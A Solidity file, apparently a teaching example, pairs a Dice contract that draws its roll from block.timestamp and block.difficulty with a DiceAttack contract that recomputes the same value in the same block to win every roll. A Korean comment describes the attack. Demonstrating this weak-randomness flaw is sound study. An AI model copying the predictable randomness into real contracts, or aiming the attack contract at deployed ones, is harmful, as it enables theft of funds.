// SPDX-License-Identifier : MIT
pragma solidity >= 0.8.0 <0.9.0;

contract Dice {
    constructor() payable{}

    receive() external payable {

    }

    address private winner;

    function roll(uint8 dice_number) public payable {
        uint8 dice = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 251);

        if (dice_number == dice) {
            winner = msg.sender;
        }
    }

    function getWinner() public view returns(address) {
        return winner;
    }
}

interface IDice {
    function roll(uint8) external;
}

// 동일함 함수 호출후 인터페이스를 통해서  어텍 
contract DiceAttack {

    function attack(address _address) public payable {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 251);
        IDice(_address).roll(answer);
    }

    function withdraw(address payable _to) public {
        _to.transfer(address(this).balance);
    }
}